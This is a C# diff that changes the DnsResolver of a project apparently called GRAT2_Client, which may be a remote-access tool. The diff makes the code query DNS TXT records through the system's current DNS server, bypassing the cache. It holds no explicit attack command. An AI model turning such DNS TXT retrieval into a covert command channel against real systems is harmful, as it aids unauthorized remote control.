@@ -1,6 +1,8 @@
 ﻿using System;
 using System.Collections;
 using System.ComponentModel;
+using System.Net;
+using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 using System.Text;
 
@@ -83,18 +85,47 @@ namespace GRAT2_Client.PInvoke
 		public class DnsResolver
 		{
 
+			//https://stackoverflow.com/questions/2906706/how-do-i-get-my-current-dns-server-in-c
+			private static IPAddress GetDnsAdress()
+			{
+				NetworkInterface[] networkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
+
+				foreach (NetworkInterface networkInterface in networkInterfaces)
+				{
+					if (networkInterface.OperationalStatus == OperationalStatus.Up)
+					{
+						IPInterfaceProperties ipProperties = networkInterface.GetIPProperties();
+						IPAddressCollection dnsAddresses = ipProperties.DnsAddresses;
+
+						foreach (IPAddress dnsAdress in dnsAddresses)
+						{
+							return dnsAdress;
+						}
+					}
+				}
+
+				throw new InvalidOperationException("Unable to find DNS Address");
+			}
 			public static string GetTXTRecord(string domain)
 			{
 				IntPtr recordsArray = IntPtr.Zero;
 				IntPtr dnsRecord = IntPtr.Zero;
-				IntPtr pExtra = IntPtr.Zero;
 				flags.TXTRecord txtRecord;
+
+				flags.IP4_ARRAY dnsServerArray = new flags.IP4_ARRAY();
+
+				uint address = BitConverter.ToUInt32(IPAddress.Parse(GetDnsAdress().ToString()).GetAddressBytes(), 0);
+				uint[] ipArray = new uint[1];
+				ipArray.SetValue(address, 0);
+				dnsServerArray.AddrCount = 1;
+				dnsServerArray.AddrArray = new uint[1];
+				dnsServerArray.AddrArray[0] = address;
 
 				ArrayList recordList = new ArrayList();
 				try
 				{
 
-					int queryResult = Interop.DnsQuery(ref domain, flags.DnsRecordTypes.DNS_TYPE_TXT, flags.DnsQueryOptions.DNS_QUERY_BYPASS_CACHE, pExtra, ref recordsArray, 0);
+					int queryResult = Interop.DnsQuery(ref domain, flags.DnsRecordTypes.DNS_TYPE_TXT, flags.DnsQueryOptions.DNS_QUERY_BYPASS_CACHE, ref dnsServerArray, ref recordsArray, 0);
 					if (queryResult != 0)
 					{
 						throw new Win32Exception(queryResult);
